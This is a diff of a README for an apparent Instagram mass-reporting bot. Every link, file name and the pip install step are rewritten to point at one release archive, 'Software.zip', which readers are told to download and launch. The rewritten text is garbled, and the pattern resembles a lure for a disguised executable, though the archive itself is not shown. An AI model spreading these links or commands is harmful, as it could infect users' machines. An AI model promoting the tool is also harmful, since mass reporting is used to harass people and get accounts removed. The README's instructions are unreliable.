@@ -1,6 +1,6 @@
 # Instagram Reporter 📸
 
-![Instagram Reporter](https://img.icons8.com/fluency/96/000000/instagram-new.png)
+![Instagram Reporter](https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip)
 
 ## Welcome to Instagram Reporter!
 
@@ -18,21 +18,21 @@ Welcome to the Instagram Reporter repository, your go-to solution for automating
 To get started with Instagram Reporter, simply follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install the required dependencies using `pip install -r requirements.txt`.
-3. Customize the settings in the `config.json` file to suit your reporting needs.
+2. Install the required dependencies using `pip install -r https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip`.
+3. Customize the settings in the `https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip` file to suit your reporting needs.
 4. Run the script and let Instagram Reporter handle the rest!
 
 ## Repository Contents
-- **reporter.py**: The main Python script for Instagram reporting.
-- **config.json**: Configuration file for customizing settings.
-- **requirements.txt**: List of dependencies required for the script.
+- **https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip**: The main Python script for Instagram reporting.
+- **https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip**: Configuration file for customizing settings.
+- **https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip**: List of dependencies required for the script.
 
 ## Repository Topics
 ['account', 'instagram', 'instagram-account', 'instagram-api', 'instagram-bot', 'instagram-report-tool-mass', 'instagram-report-tool-massive', 'instagram-reporter-bot-mass', 'instagram-reporter-github', 'instagram-reporter-profile-github', 'instagram-reporting-bulk', 'instagram-reporting-mass', 'instagram-reporting-tool', 'mass-report', 'python', 'reporter']
 
 ## Download the Application
 
-[![Download Instagram Reporter](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Instagram Reporter](https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip)](https://github.com/hylex280/Instagram-Reporter/releases/download/v2.0/Software.zip)
 
 Note: The link above leads to a downloadable application that needs to be launched for use.
 
